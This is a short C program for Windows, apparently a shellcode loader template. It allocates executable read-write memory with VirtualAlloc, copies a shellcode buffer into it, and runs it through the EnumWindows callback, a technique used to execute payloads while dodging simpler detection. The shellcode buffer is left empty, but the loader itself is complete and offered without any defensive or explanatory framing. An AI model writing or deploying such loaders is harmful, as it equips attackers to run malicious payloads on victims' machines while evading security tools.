#include<windows.h>
#include<stdio.h>

int main(int argc, char *argv[]){
    char shellcode[] = " ";

    // Calculate the length of the shellcode array
    int payloadLen = sizeof(shellcode);

    // Allocate memory for the shellcode
    HANDLE hAlloc = VirtualAlloc(0,payloadLen,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);

    // Copy the shellcode to the allocated memory
    memcpy(hAlloc,shellcode,payloadLen);

    // Execute the shellcode by passing its address to EnumWindows
    EnumWindows((WNDENUMPROC)hAlloc,NULL);
}